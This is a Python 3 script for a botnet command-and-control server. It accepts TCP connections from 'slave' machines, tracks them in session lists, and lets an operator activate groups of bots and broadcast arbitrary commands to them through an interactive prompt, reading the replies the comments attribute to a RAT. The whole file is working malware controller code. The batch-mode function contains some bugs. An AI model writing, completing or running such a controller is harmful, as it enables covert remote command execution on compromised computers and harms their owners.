#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()

allConnections = []           # Stores all BotHandler instances
activeConnections = []      # Stores all currently active BotHandler sessions
deadConnections = []        # Records the dead-instance's information
clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not

# -------------------------------------------------------------------------------------------

class BotHandler(threading.Thread):

    def __init__(self, client, client_address, active, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.isActive = active
        self.bot_id = bot_id

        # No longer using queues and instead are using specific class execute(cmd)
        #self.q = qv            

        # This line returns 'MainThread'
        #self.BotName = threading.current_thread().getName()

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print("[* BotHandler-Msg] Slave " + self.ip + ":" + str(self.port) + " connected with Session ID of " + str(self.bot_id))

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        clientAddressList[self.bot_id] = self.client_address
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
    
    def activate(self):
        print("\n[*BotHandler-Msg] Activating Bot " + str(self.bot_id) + "...")
        self.isActive = True
    
    def deactivate(self):
        print("\n[*BotHandler-Msg] Deactivating " + str(self.bot_id) + "...")
        self.isActive = False

    def isActivated(self):
        return self.isActive
    
    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def execute(self, command):

        print("\n[* BotHandler-Msg] Received Command: " + str(command) + " for bot " + str(self.bot_id))

        try:
            #RecvBotCmd += "\n"

            # Send data/command to RAT
            self.client.send(command.encode('utf-8'))
            recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT
            print(recvVal)                                          # Display message received

        except Exception as ex:
            # for t in allConnections:
            #     if t.is_alive() == False:
            #         print("\n[!] Died Thread: " + str(t))
            #         t.join()
            print("Unable to send connection to bot " + (self.bot_id) + " at " + str(self.ip))
            print(ex)


# -------------------------------------------------------------------------------------------

class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.q = qv2                        # Queue used for issuing commands

    def run(self):

        while True:

            cmd = str(input("BotCmd> "))

            if (cmd == ""):
                print("No command received. Try again...")
                pass

            elif (cmd == "exit"):
                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
                for conn in allConnections:                                         # for i in range(len(allConnections)):
                    time.sleep(0.1)
                    conn.execute(cmd)

                print("Exiting connection[s] for all bots Please wait...")
                time.sleep(5)
                os._exit(0)

            elif (cmd == "list-active"):
                
                print("---------------------------")
                print("| List of Active Sessions |")
                print("---------------------------")

                for conn in activeConnections:
                    print("| %3d | %20s |"% (conn.getID(), conn.getIP()))
                    print("-------------------------")

            elif (cmd == "list-all"):
                print("---------------------------")
                print("| List of All Connections |")
                print("---------------------------")

                for conn in allConnections:
                    print("| %3d | %15s |"% (conn.getID(), conn.getIP()))
                    print("-------------------------")

            elif (cmd == "activate"):
                
                #try:
                selectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                print("ID list obtained: " + str(selectedIDs))
                #except:

                for conn in allConnections:
                    #print("Handler: ", str(conn))

                    if conn.getID() in selectedIDs:
                        print("Activating Bot " + str(conn.getID()))
                        conn.activate()
                        activeConnections.append(conn)

                    #else:
                    #    print("Bot %d not found in active list..."% (conn.getID()))

            elif (cmd == "deactivate"):
                deselectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                print("ID list obtained: " + str(deselectedIDs))

                for conn in allConnections:
                    #print("Handler: ", str(conn))

                    if conn.getID() in deselectedIDs and conn.isActivated():
                            print("Deactivating Bot " + str(conn.getID()))
                            conn.deactivate()
                            activeConnections.remove(conn)
            elif (cmd == "batch-mode"):
                batchMode()

            else:
                print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
                for conn in activeConnections:                                         # for i in range(len(allConnections)):
                    time.sleep(0.1)
                    conn.execute(cmd)

    def batchMode(self):

        os.system("clear")
        batch_cmd = str(input("[Batch-CMD]# "))
        print("[+] Sending Command: " + batch_cmd + " to " + str(len(allConnections)) + " bots")
        for conn in activeConnections:                                         # for i in range(len(allConnections)):
            time.sleep(0.1)
            conn.execute(cmd)



# --------------------------------------------------------------------------------------------------------------------------

def listener(lhost, lport, q):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")

    BotCmdThread = BotCmd(q)        # Handles interface, queue is for commands
    BotCmdThread.start()

    connRecord = 0

    while True:

        (client, client_address) = server.accept()  # start listening
        print("Connection received from " + str(client_address[0]))

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newConn = BotHandler(client, client_address, False, connRecord)
        allConnections.append(newConn)
        connRecord += 1
        newConn.start()

# -------------------------------------------------------------------------------------------

#import
def main():
    if (len(sys.argv) < 3):
        print("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()
